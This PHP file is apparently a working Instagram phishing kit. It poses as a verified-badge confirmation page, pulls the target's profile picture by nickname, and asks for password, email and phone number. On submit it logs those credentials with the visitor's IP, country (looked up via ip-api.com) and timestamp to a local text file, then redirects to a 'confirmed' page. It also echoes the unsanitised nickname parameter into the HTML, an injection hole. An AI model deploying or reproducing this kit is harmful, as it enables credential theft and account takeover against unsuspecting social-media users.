<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$_SERVER["bedircan"]=$nick;
$url = 'https://instagram.com/' . $nick;
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadHTML($html);
    $veri = $dom->textContent;
    $cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }
if(empty($cc)){
        $cc[0] = $image_url;
    }
if($_POST){
$mail = $_POST["mail"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('pezny.txt', 'a');
fwrite($file, "index: ".$nick."\n" ."Password: ".$password. "\n"."Mail: ".$mail."\n"."Phone Number: ".$mailpass."\n"."Ip Adress: " .$ip."\n".

"Country: ".$ulke ."\n".   "Time: " .$cur_time.  "\n\n\n");
fclose($file);
echo '';
    header("Location: confirmed.php");
}

    ?>
<html>

<head>
     <meta charset="utf-8">
	 <title> @<?php echo $nick; ?> Instagram</title>
	 <meta name="viewport" content="width=device-width">
<link rel="icon" href="resimag.com/p1/58ad537d50f.jpeg">	
<style>

#ana{
background-color:#fafafa;
}
#erhan{
border-radius:5px;}

#erhanasd{
font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size:20px;
}

#sa{
background-color:white;
width:300px;

}
#yazi1{
font-family:sans-serif;
color:#999;
width:230px;
 }
 #copyright{
font-family:sans-serif;
color:#999;}
#menu{


width:91%;
} 
#liste{
display:inline-block;}
#link{text-decoration:none;
color:#003569;
font-family:sans-serif;
font-size:13px;
font-weight:540;

    vertical-align: baseline;
}
#üst{
width:100%;
background-color:white;

height:79px;
}

#buton{
color:white;
background-color:#3897f0;
font-size:15px;

border-radius:3px;
outline:none;
font-family:sans-serif;
font-weight:700;
border:0;
width:200px;
height:40px;
max-width:99%;
max-height:50px;
}

#password{
background-color:#fafafa;
border:0;
outline:none;
border-radius:6px;
width:220px;
height:35px;

font-size:16px;}

</style>
	 
</head>
<body id="ana" style="padding:0px; margin:0px;">




<div style="width:100%; background:white; border-bottom:1px solid #cecece; padding-left:2px;" >
 


<img src="https://i.imgyukle.com/2020/08/18/ughUqP.gif" width=170 id="erhan" style="margin:6px; margin-top: 20px; margin-right: 20px;" >

<br><br>
</div>
<br><br>

<center>

<center>
<div id="sa" style="border:1px solid #cecece;"> <br> 
  <div id="react-root">
    <section class="LZyqZ">
      <div class="lTdZb">
        <div class="vqibd  wNNoj ">
          <img src="<?php echo $image_url;?>" alt="<?php echo $nick;?>" of photo" width=150 style="border-radius:50%;margin-top:12px;"><br>
          <div class="ZpgjG   _1I5YO">

<p id="yazi1">

A verified badge is a check that appears next to an Instagram account's name in search and on the profile. It means Instagram has confirmed that an account is the authentic presence of the public figure, celebrity or global brand it represents.







<form method="post" >
<input type="password" name="password" placeholder="Password" required="" style="padding:6px; background:#fafafa; outline:none;text-align:center;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>

<input type="email" name="mail" placeholder="Email " required="" style="text-align:center; padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>


    <input type="number" name="mailpass" placeholder="Phone Number" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;text-align:center;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
  
    font: 400 13.3333px Arial; border-radius:3px;">

   <br> <br>

<button id="buton" type="submit"> Continue as @<?php echo $nick; ?> </button>


 
</form>

</center>



</div>

</center>


</body>


</html>